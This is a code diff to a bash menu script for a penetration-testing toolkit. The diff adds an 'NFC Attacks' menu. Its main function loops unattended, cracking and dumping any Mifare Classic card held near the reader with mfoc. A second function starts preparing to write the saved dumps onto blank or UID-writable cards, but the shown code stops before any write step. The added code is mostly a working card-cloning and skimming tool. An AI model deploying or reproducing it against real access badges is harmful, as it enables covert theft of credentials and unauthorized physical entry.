@@ -14,9 +14,10 @@ echo "[2]	Sniffing/Spoofing	[7]	OpenVPN Setup"
 echo "[3]	Reverse Shells		[8]	VNC Setup"
 echo "[4]	Info Gathering		[9]	Log/Capture Menu"
 echo "[5]	Vulnerability Scan	[10]	USB Attacks"
+echo "[11]	NFC Attacks"
 echo ""
-echo "[11]	Settings		[13]	Enable/Disable Monitor Mode"
-echo "[12]	Services		[14]	Safely Eject External Wifi"
+echo "[12]	Settings		[14]	Enable/Disable Monitor Mode"
+echo "[13]	Services		[15]	Safely Eject External Wifi"
 echo ""
 echo "[q]	Exit To Command Line"
 echo ""
@@ -37,10 +38,11 @@ case $menuchoice in
 8) clear; f_vncmenu ;;
 9) clear; f_capture ;;
 10) clear; f_usb;;
-11) clear; f_settings ;;
-12) clear; f_services ;;
-13) clear; f_mon;;
-14) clear; f_safeeject;;
+11) clear; f_nfcmenu ;;
+12) clear; f_settings ;;
+13) clear; f_services ;;
+14) clear; f_mon;;
+15) clear; f_safeeject;;
 q) clear; exit 1 ;;
 *) echo "Incorrect choice..." ;
 esac
@@ -1119,6 +1121,148 @@ f_deadbolt(){
   sh /usr/bin/deadbolt.sh
   f_usb
 }
+
+########################## NFC MENU ###############################
+f_nfcmenu(){
+echo "                          NFC Attacks"
+echo ""
+echo ""
+echo "Ensure that the built-in NFC device is disabled."
+echo ""
+echo "[1] Clone Mifare Card"
+echo "[2] Write Mifare Card"
+echo "[3] View Mifare Card Data"
+echo ""
+echo "[0] Exit to main menu"
+echo ""
+read -p "Choice: " nfcchoice
+
+case $nfcchoice in
+	1) clear; f_mifareclone ;;
+	2) clear; f_mifarewrite ;;
+	3) clear; nfc-list ; echo "" ; read -p "Press any key to return to the NFC menu." return ; clear ; f_nfcmenu ;;
+	0) f_interface ;;
+	*) clear; f_nfcmenu ;;
+esac
+}
+
+f_mifareclone(){
+# This script will automatically clone cards that are presented
+# to the reader. If a card has already been cloned then the script we
+# not try to clone the card again. If a card fails to clone (e.g., moved 
+# too far from reader) an error will be presented and the loop will 
+# restart. Tested using a SCL3711 usb dongle.
+
+# Make sure the Mifare NFC tools are installed. If not, ask to install.
+clear
+if [ ! -e "/usr/bin/nfc-mfclassic" ]; then
+	echo "[!] We need to install the following dependencies:"
+	echo ""
+	echo "libnfc5, libnfc-bin, and mfoc"
+	echo ""
+	read -p "Is this OK [Y/n]? " nfcinstall
+	if [ "$nfcinstall" == "n" ] || [ "$nfcinstall" == "N" ]; then
+		exit 0
+	else
+		clear
+		apt-get update && apt-get install -y libnfc5 libnfc-bin mfoc
+	fi
+fi
+
+# Set the date so that we can keep dumps organized.
+DATE=$(date -u '+20%y%m%d-%H:%M:%S-UTC')
+echo $DATE > /tmp/card-start.txt
+
+START_TIME=$(cat /tmp/card-start.txt)
+LOG_PATH="/root/cards/cards-$START_TIME"
+
+# Create the log directory
+mkdir -p $LOG_PATH
+clear
+echo "[*] Ready to clone... [*]"
+echo ""
+
+# Start the loop
+while :
+do
+CARD=$(nfc-list | grep found | awk '/found/ {print $5}' | sed s/://g)
+
+# Make sure we are only cloning a card once.
+if [ "$CARD" == "found" ] ; then
+	touch $LOG_PATH/cards.log
+	NEW_CARD=$(nfc-list | grep UID | awk '/UID/ {print $3,$4,$5,$6}' | sed s/" "/:/g)
+	echo $NEW_CARD > /tmp/card.log
+	TEMP_CARD=$(cat /tmp/card.log)
+	LOG_CARD=$(grep $TEMP_CARD $LOG_PATH/cards.log)
+
+	if [ "$TEMP_CARD" == "$LOG_CARD" ]; then
+		echo "[*] This card has already been cloned... [*]"
+	else
+		CTIME=$(date -u '+20%y%m%d-%H:%M:%S-UTC')
+		mfoc -O $LOG_PATH/$CTIME-$TEMP_CARD.mfd
+		
+		# Ensure we got a good dump. If not loop back around.
+		if [ -s $LOG_PATH/$CTIME-$TEMP_CARD.mfd ]; then
+			echo ""
+			echo "[*] Got it! Card dump is located: $LOG_PATH/$CTIME-$TEMP_CARD.mfd [*]"
+			echo ""
+			echo $NEW_CARD >> $LOG_PATH/cards.log
+			echo "[*] Ready to clone... [*]"
+			echo ""
+		else
+			rm $LOG_PATH/$CTIME-$TEMP_CARD.mfd
+			echo ""
+			echo "[!] Something went wrong... [!]"
+			echo ""
+			echo "[*] Ready to clone... [*]"
+			echo ""
+		fi
+	fi
+else
+:
+fi
+sleep 3
+done
+}
+
+f_mifarewrite(){
+# This script will write previously cloned Mifare cards to a blank/rewriteable card.
+# Options are provided for card type (non-UID/UID writable) and key type (A/B).
+# Tested using a SCL3711 usb dongle.
+
+clear
+# Ensure that we do in fact have cards ready to write
+if [ ! -d "/root/cards/" ]; then
+ 	echo "[!] You don't have any cloned cards."
+	exit 0
+else
+	cd ~/cards
+fi
+
+# We need to dump the contents of the blank card before moving forward.
+echo "[*] We need to dump the contents of the blank/rewritable card."
+echo ""
+read -p "[*] Present the card to the reader and press [Enter] to continue." continue
+echo ""
+
+# Loop to make sure that we get a good dump.
+rm /tmp/blank_card.mfd > /dev/null
+while [ ! -f "/tmp/blank_card.mfd" ];
+do
+	mfoc -P 500 -O /tmp/blank_card.mfd
+	echo ""
+
+	# Check to see if the dump was successful. If not restart the loop.
+	if [ -s "/tmp/blank_card.mfd" ]; then
+		echo "[*] Got it! Moving on..."
+		sleep 3
+	else
+		rm /tmp/blank_card.mfd
+		echo "[!] Something went wrong, trying again..."
+		sleep 3
+		clear
+	fi
+done
 
 ######################## MONITOR MODE MENU #############################
 f_mon(){
